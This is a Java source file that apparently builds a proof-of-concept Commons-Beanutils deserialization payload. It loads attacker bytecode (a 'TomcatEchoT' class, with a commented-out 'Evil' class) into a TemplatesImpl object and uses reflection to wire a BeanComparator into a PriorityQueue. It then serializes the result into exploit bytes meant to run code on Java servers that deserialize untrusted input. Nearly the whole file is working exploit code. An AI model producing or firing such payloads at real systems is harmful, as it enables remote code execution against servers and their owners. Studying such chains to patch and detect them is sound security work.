import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.util.PriorityQueue;

public class CommonsBeanutilsPoc {
    public byte[] getEvilBytes() throws Exception {
//        ClassPool pool = ClassPool.getDefault();
//        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
//        CtClass ctClass = pool.makeClass("Evil");
//        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
//
//        String staticCmd = "System.out.println(\"you are hacked\");";
//        ctClass.makeClassInitializer().insertBefore(staticCmd);
//        byte[] bytes = ctClass.toBytecode();
//        return bytes;

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(TomcatEchoT.class.getName());
        return clazz.toBytecode();
    }

    public TemplatesImpl getTemplatesImpl() throws Exception{
        byte[] bytes = getEvilBytes();
        Class clazz = TemplatesImpl.class;
        TemplatesImpl templates = (TemplatesImpl) clazz.newInstance();

        Field _name = clazz.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(templates, "test");

        Field _bytecodes = clazz.getDeclaredField("_bytecodes");
        _bytecodes.setAccessible(true);
        _bytecodes.set(templates, new byte[][]{bytes});

        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _tfactory.setAccessible(true);
        _tfactory.set(templates, new TransformerFactoryImpl());
        return templates;
    }
    public byte[] getPOCBytes() throws Exception {
        CommonsBeanutilsPoc commonsBeanutilsPoc = new CommonsBeanutilsPoc();
        TemplatesImpl templates = commonsBeanutilsPoc.getTemplatesImpl();

        BeanComparator beanComparator = new BeanComparator();
        Field propertyField = BeanComparator.class.getDeclaredField("property");
        propertyField.setAccessible(true);
        propertyField.set(beanComparator, "outputProperties");

        PriorityQueue priorityQueue = new PriorityQueue();
        // 设置 size
        Field sizeFiled = PriorityQueue.class.getDeclaredField("size");
        sizeFiled.setAccessible(true);
        sizeFiled.set(priorityQueue, 2);

        // 设置 comparator 为 BeanComparator
        Field comparatorField = PriorityQueue.class.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue, beanComparator);

        // 设置 queue[0] 为 TemplateImpl
        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(priorityQueue, new Object[] {templates, 1});

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(priorityQueue);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }
}
